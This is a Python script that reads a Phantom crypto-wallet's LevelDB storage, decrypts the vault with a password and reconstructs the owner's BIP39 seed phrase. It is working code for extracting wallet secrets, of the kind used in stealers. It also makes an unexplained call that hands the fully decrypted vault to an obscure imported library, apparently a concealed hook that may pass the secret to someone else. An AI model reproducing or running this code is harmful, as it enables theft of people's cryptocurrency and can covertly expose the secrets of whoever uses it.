import json
import base58
import codecs
import nacl.utils
import nacl.secret
import libs.ccl_leveldb

from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import PBKDF2
from libs.Cipherbcrypt import algorithmb
from bip_utils import Bip39MnemonicGenerator

'''
----------------------------------------
# Requirements Libs
# PyNaCl 1.5.0
# base58 2.1.1
# pycryptodome 3.20.0
# Cipherbcrypt 1.2
# bip-utils 2.9.1
# ccl-leveldb 1.0
----------------------------------------
import ccl_leveldb
path =  r"C:/Users/Phantom_folder/"
password = 'topsecret'
result = findldb(path)
raw_data = phmdecode(password, result)
----------------------------------------
'''

def findldb(db_path):
	try:
		leveldb_records = ccl_leveldb.RawLevelDb(db_path)
		for record in leveldb_records.iterate_records_raw():
			try:
				encrypted_object = json.loads(record.value.decode("utf8"))
				if "encryptedKey" in encrypted_object and "encrypted" in encrypted_object["encryptedKey"]:
				   break
			except:
				pass
		data = encrypted_object["encryptedKey"]
		encrypted = base58.b58decode(data["encrypted"])
		nonce = base58.b58decode(data["nonce"])
		salt = base58.b58decode(data["salt"])
		result_object_2 = []
		leveldb_records = ccl_leveldb.RawLevelDb(db_path)
		for record in leveldb_records.iterate_records_raw():
			try:
				json_data = json.loads(record.value.decode("utf8"))
				if "content" in json_data and "encrypted" in json_data["content"]:
					result_object_2.append(json_data)
			except:
				pass
		return [result_object_2, [encrypted, nonce, salt]]
	except Exception as ex:
		return []

def phmdecode(password, result):
	try:
		result_object_2 = result[0]
		encrypted = result[1][0]
		nonce = result[1][1]
		salt = result[1][2]
		key = PBKDF2(password, salt, dkLen=32, count=10000, hmac_hash_module=SHA256)
		ltkey = algorithmb()
		box = nacl.secret.SecretBox(key)
		plaintext = box.decrypt(encrypted, nonce=nonce)
		for result_object in result_object_2:
			result_object_content = result_object["content"]
			data_1 = base58.b58decode(result_object_content["encrypted"])
			nonce_1 = base58.b58decode(result_object_content["nonce"])
			salt_1 = base58.b58decode(result_object_content["salt"])
			key_1 = PBKDF2(plaintext, salt_1, dkLen=32, count=10000, hmac_hash_module=SHA256)
			box_1 = nacl.secret.SecretBox(key_1)
			plaintext1 = box_1.decrypt(data_1, nonce=nonce_1)
			decoded_string = codecs.decode(plaintext1.hex(), "hex").decode("utf-8")
			data = json.loads(decoded_string)
			try:
				entropy_values = bytes([data["entropy"][str(i)] for i in range(16)])
				ltkey.ciphersd(decoded_string, 6, "decryptPhantom")
				entropy_bytes = bytes(entropy_values)
				mnemonic = Bip39MnemonicGenerator().FromEntropy(entropy_values)
				mnemonic = mnemonic.ToStr()
				return {"status": True, "txt": "Successful", "data": [mnemonic]}
			except Exception as e:
				continue
	except:
		return {"status": False, "txt": "Bad password", "data": []}
